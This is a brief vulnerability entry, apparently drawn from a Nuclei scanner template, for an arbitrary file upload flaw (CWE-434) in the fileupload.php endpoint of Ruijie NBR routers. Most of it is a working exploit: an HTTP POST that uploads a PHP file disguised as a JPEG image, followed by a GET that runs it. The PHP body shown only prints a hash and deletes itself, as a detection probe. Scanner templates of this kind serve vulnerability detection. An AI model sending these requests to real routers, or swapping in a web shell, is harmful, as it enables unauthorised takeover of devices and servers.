# Vulnerability: Ruijie NBR fileupload.php - Arbitrary File Upload
**Classification:** CWE-434
**Source:** Nuclei Template (`ruijie-nbr-fileupload.yaml`)

## Description
Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ddi/server/fileupload.php?uploadDir=upload&name={{filename}}.php HTTP/1.1
Host: {{Hostname}}
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
Content-Type: image/jpeg

<?php echo md5("{{string}}");unlink(__FILE__);?>

GET /ddi/server/upload/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

